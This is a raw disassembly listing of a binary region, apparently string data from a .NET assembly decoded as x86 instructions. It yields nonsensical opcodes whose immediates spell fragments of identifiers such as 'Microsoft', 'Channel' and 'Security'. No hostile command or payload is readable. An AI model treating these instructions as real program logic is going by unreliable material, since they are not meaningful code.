  406bdb:	add    BYTE PTR [ecx+0x46],cl
  406bde:	outs   dx,DWORD PTR ds:[esi]
  406bdf:	jb     0x406c4e
  406be1:	popa   
  406be2:	je     0x406c34
  406be4:	jb     0x406c55
  406be6:	jbe    0x406c51
  406be8:	fs gs jb 0x406bec
  406bec:	inc    esi
  406bed:	outs   dx,DWORD PTR ds:[esi]
  406bee:	jb     0x406c5d
  406bf0:	popa   
  406bf1:	je     0x406bf3
  406bf3:	arpl   WORD PTR cs:[ebx+0x74],sp
  406bf7:	outs   dx,DWORD PTR ds:[esi]
  406bf8:	jb     0x406bfa
  406bfa:	push   esp
  406bfb:	jns    0x406c6d
  406bfd:	add    BYTE PTR gs:[edx+0x75],dl
  406c01:	outs   dx,BYTE PTR ds:[esi]
  406c02:	je     0x406c6d
  406c04:	ins    DWORD PTR es:[edi],dx
  406c05:	gs push esp
  406c07:	jns    0x406c79
  406c09:	gs dec eax
  406c0b:	popa   
  406c0c:	outs   dx,BYTE PTR ds:[esi]
  406c0d:	fs ins BYTE PTR es:[edi],dx
  406c0f:	add    BYTE PTR gs:[edi+0x65],al
  406c13:	je     0x406c69
  406c15:	jns    0x406c87
  406c17:	gs inc esi
  406c19:	jb     0x406c8a
  406c1b:	ins    DWORD PTR es:[edi],dx
  406c1c:	dec    eax
  406c1d:	popa   
  406c1e:	outs   dx,BYTE PTR ds:[esi]
  406c1f:	fs ins BYTE PTR es:[edi],dx
  406c21:	add    BYTE PTR gs:[ebp+0x6f],cl
  406c25:	fs jne 0x406c94
  406c28:	add    BYTE PTR gs:[edi+0x65],ah
  406c2c:	je     0x406c8d
  406c2e:	dec    ebp
  406c2f:	outs   dx,DWORD PTR ds:[esi]
  406c30:	fs jne 0x406c9f
  406c33:	add    BYTE PTR gs:[ecx+0x73],al
  406c37:	jae    0x406c9e
  406c39:	ins    DWORD PTR es:[edi],dx
  406c3a:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  406c3e:	addr16 gs je 0x406ca1
  406c42:	inc    ecx
  406c43:	jae    0x406cb8
  406c45:	gs ins DWORD PTR es:[edi],dx
  406c47:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  406c4b:	dec    ebp
  406c4c:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  406c53:	je     0x406c83
  406c55:	push   edx
  406c56:	gs jo  0x406cc8
  406c59:	jb     0x406ccf
  406c5b:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  406c62:	imul   esp,DWORD PTR [ebx+0x65],0x65442e73
  406c69:	jae    0x406cd4
  406c6b:	outs   dx,BYTE PTR ds:[si]
  406c6d:	gs jb  0x406c70
  406c70:	dec    ebp
  406c71:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  406c78:	je     0x406ca8
  406c7a:	push   edx
  406c7b:	gs jo  0x406ced
  406c7e:	jb     0x406cf4
  406c80:	inc    esp
  406c81:	gs jae 0x406ced
  406c84:	outs   dx,BYTE PTR ds:[si]
  406c86:	gs jb  0x406cb7
  406c89:	inc    esp
  406c8a:	gs jae 0x406cf6
  406c8d:	outs   dx,BYTE PTR ds:[si]
  406c8f:	add    BYTE PTR [eax+0x72],dl
  406c92:	gs jbe 0x406cfe
  406c95:	gs ja  0x406ce8
  406c98:	jb     0x406d09
  406c9a:	arpl   WORD PTR [ebp+0x73],sp
  406c9d:	jae    0x406d08
  406c9f:	outs   dx,BYTE PTR ds:[esi]
  406ca0:	addr16 push ebx
  406ca2:	gs jb  0x406d1b
  406ca5:	imul   esp,DWORD PTR [ebx+0x65],0x75677241
  406cac:	ins    DWORD PTR es:[edi],dx
  406cad:	outs   dx,BYTE PTR gs:[esi]
  406caf:	je     0x406d24
  406cb1:	add    BYTE PTR [ebx+0x74],dl
  406cb4:	popa   
  406cb5:	jb     0x406d2b
  406cb7:	jne    0x406d29
  406cb9:	push   ebx
  406cba:	gs ins DWORD PTR es:[edi],dx
  406cbc:	popa   
  406cbd:	jo     0x406d27
  406cbf:	outs   dx,DWORD PTR ds:[esi]
  406cc0:	jb     0x406d27
  406cc2:	dec    esi
  406cc3:	popa   
  406cc4:	ins    DWORD PTR es:[edi],dx
  406cc5:	add    BYTE PTR gs:[ebx+0x6f],al
  406cc9:	ins    DWORD PTR es:[edi],dx
  406cca:	ins    DWORD PTR es:[edi],dx
  406ccb:	jne    0x406d3b
  406ccd:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  406cd4:	dec    edi
  406cd5:	bound  ebp,QWORD PTR [edx+0x65]
  406cd8:	arpl   WORD PTR [eax+eax*1+0x4f],si
  406cdc:	jo     0x406d43
  406cde:	outs   dx,BYTE PTR ds:[esi]
  406cdf:	add    BYTE PTR [ebx+0x6c],al
  406ce2:	outs   dx,DWORD PTR ds:[esi]
  406ce3:	jae    0x406d4a
  406ce5:	add    BYTE PTR [eax+0x72],dl
  406ce8:	gs jbe 0x406d54
  406ceb:	gs ja  0x406d3e
  406cee:	jb     0x406d5f
  406cf0:	arpl   WORD PTR [ebp+0x73],sp
  406cf3:	jae    0x406d5e
  406cf5:	outs   dx,BYTE PTR ds:[esi]
  406cf6:	addr16 push ebx
  406cf8:	gs jb  0x406d71
  406cfb:	imul   esp,DWORD PTR [ebx+0x65],0x74697845
  406d02:	inc    ebx
  406d03:	outs   dx,DWORD PTR ds:[esi]
  406d04:	fs gs jae 0x406d08
  406d08:	dec    esi
  406d09:	outs   dx,DWORD PTR ds:[esi]
  406d0a:	jb     0x406d79
  406d0c:	popa   
  406d0d:	ins    BYTE PTR es:[edi],dx
  406d0e:	push   esp
  406d0f:	gs jb  0x406d7f
  406d12:	imul   ebp,DWORD PTR [esi+0x61],0x6e6f6974
  406d19:	add    BYTE PTR [ecx+0x62],al
  406d1c:	outs   dx,BYTE PTR ds:[esi]
  406d1d:	outs   dx,DWORD PTR ds:[esi]
  406d1e:	jb     0x406d8d
  406d20:	popa   
  406d21:	ins    BYTE PTR es:[edi],dx
  406d22:	push   esp
  406d23:	gs jb  0x406d93
  406d26:	imul   ebp,DWORD PTR [esi+0x69],0x6f697461
  406d2d:	outs   dx,BYTE PTR ds:[esi]
  406d2e:	add    BYTE PTR [eax+0x72],dl
  406d31:	outs   dx,DWORD PTR ds:[esi]
  406d32:	arpl   WORD PTR [ebp+0x73],sp
  406d35:	jae    0x406d37
  406d37:	inc    edi
  406d38:	gs je  0x406d7e
  406d3b:	jne    0x406daf
  406d3d:	jb     0x406da4
  406d3f:	outs   dx,BYTE PTR ds:[esi]
  406d40:	je     0x406d92
  406d42:	jb     0x406db3
  406d44:	arpl   WORD PTR [ebp+0x73],sp
  406d47:	jae    0x406d49
  406d49:	addr16 gs je 0x406dac
  406d4d:	dec    ecx
  406d4e:	add    BYTE PTR fs:[eax+0x72],dl
  406d52:	gs jbe 0x406dbe
  406d55:	gs ja  0x406da8
  406d58:	jb     0x406dc9
  406d5a:	arpl   WORD PTR [ebp+0x73],sp
  406d5d:	jae    0x406dc8
  406d5f:	outs   dx,BYTE PTR ds:[esi]
  406d60:	addr16 push ebx
  406d62:	gs jb  0x406ddb
  406d65:	imul   esp,DWORD PTR [ebx+0x65],0x736e6f43
  406d6c:	je     0x406dcf
  406d6e:	outs   dx,BYTE PTR ds:[esi]
  406d6f:	je     0x406de4
  406d71:	add    BYTE PTR [ebx+0x6f],al
  406d74:	outs   dx,BYTE PTR ds:[esi]
  406d75:	jae    0x406deb
  406d77:	jb     0x406dee
  406d79:	arpl   WORD PTR [ecx+eax*2+0x70],si
  406d7d:	jo     0x406dcc
  406d7f:	popa   
  406d80:	outs   dx,BYTE PTR ds:[esi]
  406d81:	popa   
  406d82:	gs ins DWORD PTR es:[di],dx
  406d85:	outs   dx,BYTE PTR gs:[esi]
  406d87:	je     0x406dde
  406d89:	jb     0x406df7
  406d8b:	add    BYTE PTR [ebp+0x72],dl
  406d8e:	imul   eax,DWORD PTR [eax],0x4b697255
  406d94:	imul   ebp,DWORD PTR [esi+0x64],0x74654e00
  406d9b:	dec    esi
  406d9c:	popa   
  406d9d:	ins    DWORD PTR es:[edi],dx
  406d9e:	gs fs push eax
  406da1:	imul   esi,DWORD PTR [eax+0x65],0x646e6942
  406da8:	imul   ebp,DWORD PTR [esi+0x67],0x6e694200
  406daf:	imul   ebp,DWORD PTR fs:[esi+0x67],0x706c6548
  406db7:	gs jb  0x406e2d
  406dba:	add    BYTE PTR [ecx+0x6e],cl
  406dbd:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  406dc5:	add    BYTE PTR [ecx+0x70],al
  406dc8:	jo     0x406e17
  406dca:	popa   
  406dcb:	outs   dx,BYTE PTR ds:[esi]
  406dcc:	popa   
  406dcd:	gs ins DWORD PTR es:[di],dx
  406dd0:	outs   dx,BYTE PTR gs:[esi]
  406dd2:	je     0x406e19
  406dd4:	outs   dx,BYTE PTR ds:[esi]
  406dd5:	fs jo  0x406e47
  406dd8:	imul   ebp,DWORD PTR [esi+0x74],0x72646441
  406ddf:	gs jae 0x406e55
  406de2:	add    BYTE PTR [edx+0x69],al
  406de5:	outs   dx,BYTE PTR ds:[esi]
  406de6:	imul   ebp,DWORD PTR fs:[esi+0x67],0x64644100
  406dee:	push   ebx
  406def:	gs jb  0x406e68
  406df2:	imul   esp,DWORD PTR [ebx+0x65],0x70646e45
  406df9:	outs   dx,DWORD PTR ds:[esi]
  406dfa:	imul   ebp,DWORD PTR [esi+0x74],0x74656700
  406e01:	pop    edi
  406e02:	inc    esp
  406e03:	gs jae 0x406e69
  406e06:	jb     0x406e71
  406e08:	jo     0x406e7e
  406e0a:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  406e11:	je     0x406e78
  406e13:	ins    DWORD PTR es:[edi],dx
  406e14:	cs inc ebx
  406e16:	outs   dx,DWORD PTR ds:[esi]
  406e17:	ins    BYTE PTR es:[edi],dx
  406e18:	ins    BYTE PTR es:[edi],dx
  406e19:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406e1e:	outs   dx,BYTE PTR ds:[esi]
  406e1f:	jae    0x406e4f
  406e21:	inc    edi
  406e22:	outs   dx,BYTE PTR gs:[esi]
  406e24:	gs jb  0x406e90
  406e27:	arpl   WORD PTR [eax],ax
  406e29:	dec    ebx
  406e2a:	gs jns 0x406e92
  406e2d:	fs inc edx
  406e2f:	jns    0x406e85
  406e31:	jns    0x406ea3
  406e33:	gs inc ebx
  406e35:	outs   dx,DWORD PTR ds:[esi]
  406e36:	ins    BYTE PTR es:[edi],dx
  406e37:	ins    BYTE PTR es:[edi],dx
  406e38:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406e3d:	outs   dx,BYTE PTR ds:[esi]
  406e3e:	pusha  
  406e3f:	xor    DWORD PTR [eax],eax
  406e41:	addr16 gs je 0x406ea4
  406e45:	inc    edx
  406e46:	gs push 0x6f697661
  406e4c:	jb     0x406ec1
  406e4e:	add    BYTE PTR [ecx+0x64],al
  406e51:	add    BYTE PTR fs:[ebx+0x6f],al
  406e55:	outs   dx,BYTE PTR ds:[esi]
  406e56:	jae    0x406ecc
  406e58:	jb     0x406ecf
  406e5a:	arpl   WORD PTR [eax+edx*2+0x72],si
  406e5e:	outs   dx,DWORD PTR ds:[esi]
  406e5f:	arpl   WORD PTR [ebp+0x73],sp
  406e62:	jae    0x406ecd
  406e64:	outs   dx,BYTE PTR ds:[esi]
  406e65:	addr16 push ebp
  406e67:	jb     0x406ed5
  406e69:	add    BYTE PTR [eax+0x72],dl
  406e6c:	outs   dx,DWORD PTR ds:[esi]
  406e6d:	arpl   WORD PTR [ebp+0x73],sp
  406e70:	jae    0x406edb
  406e72:	outs   dx,BYTE PTR ds:[esi]
  406e73:	addr16 push ebx
  406e75:	gs jb  0x406eee
  406e78:	imul   esp,DWORD PTR [ebx+0x65],0x70646e45
  406e7f:	outs   dx,DWORD PTR ds:[esi]
  406e80:	imul   ebp,DWORD PTR [esi+0x74],0x72646441
  406e87:	gs jae 0x406efd
  406e8a:	add    BYTE PTR [edx+0x65],dl
  406e8d:	arpl   WORD PTR [edi+0x76],bp
  406e90:	gs jb  0x406ef4
  406e93:	bound  ebp,QWORD PTR [ebp+eiz*2+0x46]
  406e97:	popa   
  406e98:	jne    0x406f06
  406e9a:	je     0x406ee4
  406e9c:	popa   
  406e9d:	outs   dx,BYTE PTR ds:[esi]
  406e9e:	fs ins BYTE PTR es:[edi],dx
  406ea0:	gs jb  0x406ef6
  406ea3:	gs jb  0x406f1c
  406ea6:	imul   esp,DWORD PTR [ebx+0x65],0x61686542
  406ead:	jbe    0x406f18
  406eaf:	outs   dx,DWORD PTR ds:[esi]
  406eb0:	jb     0x406eb2
  406eb2:	push   edi
  406eb3:	popa   
  406eb4:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  406ebc:	add    BYTE PTR [edi+0x61],dl
  406ebf:	imul   esi,DWORD PTR [edi+ecx*2+0x6e],0x73490065
  406ec7:	dec    esi
  406ec8:	jne    0x406f36
  406eca:	ins    BYTE PTR es:[edi],dx
  406ecb:	dec    edi
  406ecc:	jb     0x406f13
  406ece:	ins    DWORD PTR es:[edi],dx
  406ecf:	jo     0x406f45
  406ed1:	jns    0x406ed3
  406ed3:	push   ebx
  406ed4:	gs ins DWORD PTR es:[edi],dx
  406ed6:	popa   
  406ed7:	jo     0x406f41
  406ed9:	outs   dx,DWORD PTR ds:[esi]
  406eda:	jb     0x406f41
  406edc:	add    BYTE PTR [edi+0x70],cl
  406edf:	outs   dx,BYTE PTR gs:[esi]
  406ee1:	inc    ebp
  406ee2:	js     0x406f4d
  406ee4:	jae    0x406f5a
  406ee6:	imul   ebp,DWORD PTR [esi+0x67],0x6c655200
  406eed:	gs popa 
  406eef:	jae    0x406f56
  406ef1:	add    BYTE PTR [ebp+0x6d],al
  406ef4:	jo     0x406f6a
  406ef6:	jns    0x406ef8
  406ef8:	inc    ebp
  406ef9:	jbe    0x406f60
  406efb:	outs   dx,BYTE PTR ds:[esi]
  406efc:	je     0x406f55
  406efe:	popa   
  406eff:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  406f07:	add    BYTE PTR [ebx+0x65],dl
  406f0a:	je     0x406f0c
  406f0c:	inc    ebx
  406f0d:	push   0x656e6e61
  406f12:	ins    BYTE PTR es:[edi],dx
  406f13:	inc    esp
  406f14:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  406f1b:	gs jb  0x406f61
  406f1e:	outs   dx,DWORD PTR ds:[esi]
  406f1f:	ins    BYTE PTR es:[edi],dx
  406f20:	ins    BYTE PTR es:[edi],dx
  406f21:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406f26:	outs   dx,BYTE PTR ds:[esi]
  406f27:	add    BYTE PTR [edi+0x65],ah
  406f2a:	je     0x406f8b
  406f2c:	inc    ebx
  406f2d:	push   0x656e6e61
  406f32:	ins    BYTE PTR es:[edi],dx
  406f33:	inc    esp
  406f34:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  406f3b:	gs jb  0x406fb1
  406f3e:	add    BYTE PTR [ebx+0x79],dl
  406f41:	outs   dx,BYTE PTR ds:[esi]
  406f42:	arpl   WORD PTR [eax+0x72],bp
  406f45:	outs   dx,DWORD PTR ds:[esi]
  406f46:	outs   dx,BYTE PTR ds:[esi]
  406f47:	imul   edi,DWORD PTR [edx+0x65],0x6c6f4364
  406f4e:	ins    BYTE PTR es:[edi],dx
  406f4f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406f54:	outs   dx,BYTE PTR ds:[esi]
  406f55:	pusha  
  406f56:	xor    DWORD PTR [eax],eax
  406f58:	inc    ebx
  406f59:	push   0x656e6e61
  406f5e:	ins    BYTE PTR es:[edi],dx
  406f5f:	inc    esp
  406f60:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  406f67:	gs jb  0x406fac
  406f6a:	popa   
  406f6b:	jae    0x406fd2
  406f6d:	add    BYTE PTR [ecx+0x45],cl
  406f70:	outs   dx,BYTE PTR ds:[esi]
  406f71:	jne    0x406fe0
  406f73:	gs jb  0x406fd7
  406f76:	je     0x406fe7
  406f78:	jb     0x406fda
  406f7a:	xor    DWORD PTR [eax],eax
  406f7c:	inc    edi
  406f7d:	gs je  0x406fc5
  406f80:	outs   dx,BYTE PTR ds:[esi]
  406f81:	jne    0x406ff0
  406f83:	gs jb  0x406fe7
  406f86:	je     0x406ff7
  406f88:	jb     0x406f8a
  406f8a:	addr16 gs je 0x406fed
  406f8e:	inc    ebx
  406f8f:	jne    0x407003
  406f91:	jb     0x406ff8
  406f93:	outs   dx,BYTE PTR ds:[esi]
  406f94:	je     0x406f96
  406f96:	inc    ebx
  406f97:	push   0x656e6e61
  406f9c:	ins    BYTE PTR es:[edi],dx
  406f9d:	inc    esp
  406f9e:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  406fa5:	gs jb  0x406fa8
  406fa8:	inc    ebp
  406fa9:	outs   dx,BYTE PTR ds:[esi]
  406faa:	fs jo  0x40701c
  406fad:	imul   ebp,DWORD PTR [esi+0x74],0x70736944
  406fb4:	popa   
  406fb5:	je     0x40701a
  406fb7:	push   0x67007265
  406fbc:	gs je  0x40701e
  406fbf:	inc    ebp
  406fc0:	outs   dx,BYTE PTR ds:[esi]
  406fc1:	fs jo  0x407033
  406fc4:	imul   ebp,DWORD PTR [esi+0x74],0x69440073
  406fcb:	jae    0x40703d
  406fcd:	popa   
  406fce:	je     0x407033
  406fd0:	push   0x746e7552
  406fd5:	imul   ebp,DWORD PTR [ebp+0x65],0x74656700
  406fdc:	pop    edi
  406fdd:	inc    esp
  406fde:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  406fe5:	push   edx
  406fe6:	jne    0x407056
  406fe8:	je     0x407053
  406fea:	ins    DWORD PTR es:[edi],dx
  406feb:	add    BYTE PTR gs:[edi+0x65],ah
  406fef:	je     0x407050
  406ff1:	dec    ebp
  406ff2:	gs jae 0x407068
  406ff5:	popa   
  406ff6:	addr16 gs dec ecx
  406ff9:	outs   dx,BYTE PTR ds:[esi]
  406ffa:	jae    0x40706c
  406ffc:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  407001:	jae    0x407003
  407003:	push   ebx
  407004:	jns    0x407079
  407006:	je     0x40706d
  407008:	ins    DWORD PTR es:[edi],dx
  407009:	cs inc ebx
  40700b:	outs   dx,DWORD PTR ds:[esi]
  40700c:	ins    BYTE PTR es:[edi],dx
  40700d:	ins    BYTE PTR es:[edi],dx
  40700e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407013:	outs   dx,BYTE PTR ds:[esi]
  407014:	jae    0x407016
  407016:	dec    ecx
  407017:	inc    ebp
  407018:	outs   dx,BYTE PTR ds:[esi]
  407019:	jne    0x407088
  40701b:	gs jb  0x40707f
  40701e:	je     0x40708f
  407020:	jb     0x407022
  407022:	dec    ebp
  407023:	outs   dx,DWORD PTR ds:[esi]
  407024:	jbe    0x40708b
  407026:	dec    esi
  407027:	gs js  0x40709e
  40702a:	add    BYTE PTR [edi+0x70],cl
  40702d:	gs jb  0x407091
  407030:	je     0x40709b
  407032:	outs   dx,DWORD PTR ds:[esi]
  407033:	outs   dx,BYTE PTR ds:[esi]
  407034:	inc    ebx
  407035:	outs   dx,DWORD PTR ds:[esi]
  407036:	outs   dx,BYTE PTR ds:[esi]
  407037:	je     0x40709e
  407039:	js     0x4070af
  40703b:	add    BYTE PTR [ebx+0x65],dl
  40703e:	jb     0x4070b6
  407040:	imul   esp,DWORD PTR [ebx+0x65],0x75636553
  407047:	jb     0x4070b2
  407049:	je     0x4070c4
  40704b:	inc    ebx
  40704c:	outs   dx,DWORD PTR ds:[esi]
  40704d:	outs   dx,BYTE PTR ds:[esi]
  40704e:	je     0x4070b5
  407050:	js     0x4070c6
  407052:	add    BYTE PTR [edi+0x65],ah
  407055:	je     0x4070b6
  407057:	push   ebx
  407058:	gs jb  0x4070d1
  40705b:	imul   esp,DWORD PTR [ebx+0x65],0x75636553
  407062:	jb     0x4070cd
  407064:	je     0x4070df
  407066:	inc    ebx
  407067:	outs   dx,DWORD PTR ds:[esi]
  407068:	outs   dx,BYTE PTR ds:[esi]
  407069:	je     0x4070d0
  40706b:	js     0x4070e1
  40706d:	add    BYTE PTR [ebx+0x79],dl
  407070:	jae    0x4070e6
  407072:	gs ins DWORD PTR es:[edi],dx
  407074:	cs push ebx
  407076:	arpl   WORD PTR gs:[ebp+0x72],si
  40707a:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6e697250
  407082:	arpl   WORD PTR [ecx+0x70],bp
  407085:	popa   
  407086:	ins    BYTE PTR es:[edi],dx
  407087:	add    BYTE PTR [ecx+0x49],cl
  40708a:	fs outs dx,BYTE PTR gs:[esi]
  40708d:	je     0x4070f8
  40708f:	je     0x40710a
  407091:	add    BYTE PTR [edi+0x65],ah
  407094:	je     0x4070f5
  407096:	push   eax
  407097:	jb     0x407102
  407099:	ins    DWORD PTR es:[edi],dx
  40709a:	popa   
  40709b:	jb     0x407116
  40709d:	dec    ecx
  40709e:	fs outs dx,BYTE PTR gs:[esi]
  4070a1:	je     0x40710c
  4070a3:	je     0x40711e
  4070a5:	add    BYTE PTR [edi+0x69],dl
  4070a8:	outs   dx,BYTE PTR ds:[esi]
  4070a9:	outs   dx,DWORD PTR fs:[esi]
  4070ab:	ja     0x407120
  4070ad:	dec    ecx
  4070ae:	fs outs dx,BYTE PTR gs:[esi]
  4070b1:	je     0x40711c
  4070b3:	je     0x40712e
  4070b5:	add    BYTE PTR [edi+0x65],al
  4070b8:	je     0x4070fd
  4070ba:	jne    0x40712e
  4070bc:	jb     0x407123
  4070be:	outs   dx,BYTE PTR ds:[esi]
  4070bf:	je     0x4070c1
  4070c1:	outs   dx,DWORD PTR ds:[esi]
  4070c2:	jo     0x407123
  4070c4:	dec    ecx
  4070c5:	outs   dx,BYTE PTR ds:[esi]
  4070c6:	gs jno 0x40713e
  4070c9:	popa   
  4070ca:	ins    BYTE PTR es:[edi],dx
  4070cb:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x76726553
  4070d3:	imul   esp,DWORD PTR [ebx+0x65],0x746e6f43
  4070da:	jb     0x40713d
  4070dc:	arpl   WORD PTR [ecx+eax*2+0x74],si
  4070e0:	je     0x407154
  4070e2:	imul   esp,DWORD PTR [edx+0x75],0x4f006574
  4070e9:	jo     0x407150
  4070eb:	jb     0x40714e
  4070ed:	je     0x407158
  4070ef:	outs   dx,DWORD PTR ds:[esi]
  4070f0:	outs   dx,BYTE PTR ds:[esi]
  4070f1:	inc    ebx
  4070f2:	outs   dx,DWORD PTR ds:[esi]
  4070f3:	outs   dx,BYTE PTR ds:[esi]
  4070f4:	je     0x407168
  4070f6:	popa   
  4070f7:	arpl   WORD PTR [ecx+eax*2+0x74],si
  4070fb:	je     0x40716f
  4070fd:	imul   esp,DWORD PTR [edx+0x75],0x3c006574
  407104:	arpl   WORD PTR ds:[edi+0x5f],bx
  407108:	inc    esp
  407109:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  407110:	ins    BYTE PTR es:[edi],dx
  407111:	popa   
  407112:	jae    0x407187
  407114:	xor    DWORD PTR [eax],eax
  407116:	fs imul bp,WORD PTR gs:[esi+0x69],0x6974
  40711e:	outs   dx,DWORD PTR ds:[esi]
  40711f:	outs   dx,BYTE PTR ds:[esi]
  407120:	inc    edx
  407121:	jns    0x407197
  407123:	gs jae 0x407126
  407126:	cmp    al,0x3e
  407128:	xor    al,0x5f
  40712a:	pop    edi
  40712b:	je     0x407195
  40712d:	imul   esi,DWORD PTR [ebx+0x0],0x7465473c
  407134:	push   edx
  407135:	gs jo  0x4071a7
  407138:	jb     0x4071ae
  40713a:	inc    esp
  40713b:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  407142:	outs   dx,DWORD PTR ds:[esi]
  407143:	outs   dx,BYTE PTR ds:[esi]
  407144:	bound  ebx,QWORD PTR ds:[edi+0x5f]
  407148:	xor    BYTE PTR [eax],al
  40714a:	dec    ebp
  40714b:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  407152:	je     0x407182
  407154:	push   edx
  407155:	gs jo  0x4071c7
  407158:	jb     0x4071ce
  40715a:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  407161:	imul   esp,DWORD PTR [ebx+0x65],0x69442e73
  407168:	popa   
  407169:	outs   dx,BYTE PTR ds:[si]
  40716b:	outs   dx,DWORD PTR ds:[esi]
  40716c:	jae    0x4071e2
  40716e:	imul   esp,DWORD PTR [ebx+0x73],0x74614300
  407175:	popa   
  407176:	ins    BYTE PTR es:[edi],dx
  407177:	outs   dx,DWORD PTR ds:[esi]
  407178:	addr16 dec ecx
  40717a:	je     0x4071e1
  40717c:	ins    DWORD PTR es:[edi],dx
  40717d:	inc    ebx
  40717e:	outs   dx,DWORD PTR ds:[esi]
  40717f:	outs   dx,BYTE PTR ds:[esi]
  407180:	je     0x4071e7
  407182:	js     0x4071f8
  407184:	inc    edx
  407185:	popa   
  407186:	jae    0x4071ed
  407188:	pusha  
  407189:	xor    DWORD PTR [eax],eax
  40718b:	addr16 gs je 0x4071ee
  40718f:	dec    ecx
  407190:	je     0x4071f7
  407192:	ins    DWORD PTR es:[edi],dx
  407193:	push   eax
  407194:	popa   
  407195:	je     0x4071ff
  407197:	add    BYTE PTR [esi+edi*1],bh
  40719a:	arpl   WORD PTR [edi+0x5f],bx
  40719d:	inc    esp
  40719e:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  4071a5:	ins    BYTE PTR es:[edi],dx
  4071a6:	popa   
  4071a7:	jae    0x40721c
  4071a9:	xor    al,0x0
  4071ab:	ins    DWORD PTR es:[edi],dx
  4071ac:	imul   ebp,DWORD PTR [ebp+0x65],0x65707954
  4071b3:	dec    esp
  4071b4:	outs   dx,DWORD PTR ds:[esi]
  4071b5:	arpl   WORD PTR [ecx+0x6c],sp
  4071b8:	add    BYTE PTR [edx+0x65],dh
  4071bb:	jae    0x40722c
  4071bd:	jne    0x407231
  4071bf:	arpl   WORD PTR [ebp+0x42],sp
  4071c2:	jns    0x407238
  4071c4:	gs jae 0x4071c7
  4071c7:	cmp    al,0x47
  4071c9:	gs je  0x40721e
  4071cc:	gs jae 0x40723e
  4071cf:	jne    0x407243
  4071d1:	arpl   WORD PTR [ebp+0x3e],sp
  4071d4:	bound  ebx,QWORD PTR [edi+0x5f]
  4071d7:	xor    eax,DWORD PTR [eax]
  4071d9:	cmp    al,0x3e
  4071db:	arpl   WORD PTR [edi+0x5f],bx
  4071de:	inc    esp
  4071df:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  4071e6:	ins    BYTE PTR es:[edi],dx
  4071e7:	popa   
  4071e8:	jae    0x40725d
  4071ea:	aaa    
  4071eb:	add    BYTE PTR [ebx+esi*2+0x69],ah
  4071ef:	inc    edx
  4071f0:	jns    0x407266
  4071f2:	gs jae 0x4071f5
  4071f5:	cmp    al,0x47
  4071f7:	gs je  0x40723e
  4071fa:	popa   
  4071fb:	je     0x40725e
  4071fd:	push   ebx
  4071fe:	outs   dx,DWORD PTR ds:[esi]
  4071ff:	jne    0x407273
  407201:	arpl   WORD PTR [ebp+0x3e],sp
  407204:	bound  ebx,QWORD PTR [edi+0x5f]
  407207:	add    BYTE PTR ss:[edx+0x69],al
  40720b:	outs   dx,BYTE PTR ds:[esi]
  40720c:	popa   
  40720d:	jb     0x407288
  40720f:	inc    esi
  407210:	outs   dx,DWORD PTR ds:[esi]
  407211:	jb     0x407280
  407213:	popa   
  407214:	je     0x40728a
  407216:	gs jb  0x407261
  407219:	gs ins BYTE PTR es:[edi],dx
  40721b:	jo     0x407282
  40721d:	jb     0x40721f
  40721f:	inc    esp
  407220:	gs jae 0x407288
  407223:	jb     0x40728e
  407225:	popa   
  407226:	ins    BYTE PTR es:[edi],dx
  407227:	imul   edi,DWORD PTR [edx+0x65],0x633e3c00
  40722e:	pop    edi
  40722f:	pop    edi
  407230:	inc    esp
  407231:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  407238:	ins    BYTE PTR es:[edi],dx
  407239:	popa   
  40723a:	jae    0x4072af
  40723c:	popa   
  40723d:	add    BYTE PTR [edi+eax*2],bh
  407240:	gs je  0x407287
  407243:	popa   
  407244:	je     0x4072a7
  407246:	push   ebx
  407247:	gs je  0x407288
  40724a:	bound  ebx,QWORD PTR [edi+0x5f]
  40724d:	cmp    DWORD PTR [eax],eax
  40724f:	dec    esi
  407250:	outs   dx,DWORD PTR ds:[esi]
  407251:	je     0x4072a6
  407253:	jne    0x4072c5
  407255:	jo     0x4072c6
  407257:	jb     0x4072cd
  407259:	gs fs inc ebp
  40725c:	js     0x4072c1
  40725e:	gs jo  0x4072d5
  407261:	imul   ebp,DWORD PTR [edi+0x6e],0x633e3c00
  407268:	pop    edi
  407269:	pop    edi
  40726a:	inc    esp
  40726b:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  407272:	ins    BYTE PTR es:[edi],dx
  407273:	popa   
  407274:	jae    0x4072e9
  407276:	add    BYTE PTR fs:[ebp+0x73],dh
  40727a:	gs jb  0x4072cb
  40727d:	popa   
  40727e:	ins    DWORD PTR es:[edi],dx
  40727f:	gs dec esp
  407281:	outs   dx,DWORD PTR ds:[esi]
  407282:	arpl   WORD PTR [ecx+0x6c],sp
  407285:	add    BYTE PTR [eax+0x61],dh
  407288:	jae    0x4072fd
  40728a:	ja     0x4072fb
  40728c:	jb     0x4072f2
  40728e:	dec    esp
  40728f:	outs   dx,DWORD PTR ds:[esi]
  407290:	arpl   WORD PTR [ecx+0x6c],sp
  407293:	add    BYTE PTR [edi+eax*2],bh
